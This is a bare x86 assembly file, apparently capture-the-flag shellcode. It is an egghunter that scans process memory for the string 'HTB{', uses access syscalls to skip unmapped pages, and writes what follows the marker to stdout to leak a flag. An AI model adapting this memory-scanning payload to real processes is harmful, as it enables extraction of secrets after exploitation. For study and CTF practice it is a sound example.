section .text
global _start

_start:
    push 0x1b
    pop eax
    push 0x7F
    pop ebx
    int 0x80
	mov edi, 0x7b425448     
	mov edx, 0x5FFFFFFF     

next_page:
    or dx, 0xfff

next_address:
    inc edx
    pusha
    lea ebx, [edx]
    mov al, 0x21
    xor ecx,ecx            
    int 0x80                
    cmp al, 0xf2            
    popa
    jz next_page            
    cmp [edx], edi          
    jnz next_address        
    push 0x4                
    pop eax
    xor ebx,ebx             
    inc bl                  
    mov ecx, edx
    push 0x24               
    pop edx
    int 0x80
    jmp _start

